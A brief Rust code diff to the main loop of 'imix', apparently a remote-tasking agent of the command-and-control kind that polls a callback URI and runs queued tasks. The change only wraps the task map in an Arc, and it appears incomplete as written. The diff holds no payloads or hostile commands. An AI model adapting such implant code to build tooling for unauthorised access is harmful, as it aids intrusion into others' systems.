@@ -7,6 +7,7 @@ use imix::init::agent_init;
 use imix::tasks::{start_new_tasks, submit_task_output};
 use imix::{tasks, Config, TaskID};
 use std::collections::HashMap;
+use std::sync::Arc;
 use std::time::Instant;
 
 fn get_callback_uri(imix_config: Config) -> Result<String> {
@@ -20,7 +21,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
 
     // This hashmap tracks all tasks by their ID (key) and a tuple value: (future, channel_reciever)
     // AKA Work queue
-    let mut all_exec_futures: HashMap<TaskID, AsyncTask> = HashMap::new();
+    let mut all_exec_futures: Arc<HashMap<TaskID, AsyncTask>> = Arc::new(HashMap::new());
     // This hashmap tracks all tasks output
     // AKA Results queue
     let mut all_task_res_map: HashMap<TaskID, Vec<TaskOutput>> = HashMap::new();
@@ -79,7 +80,7 @@ async fn main_loop(config_path: String, loop_count_max: Option<i32>) -> Result<(
             new_tasks.len()
         );
 
-        start_new_tasks(new_tasks, &mut all_exec_futures, loop_start_time).await?;
+        start_new_tasks(new_tasks, all_exec_futures, loop_start_time).await?;
 
         // 3. Sleep till callback time
         let time_to_sleep = imix_config
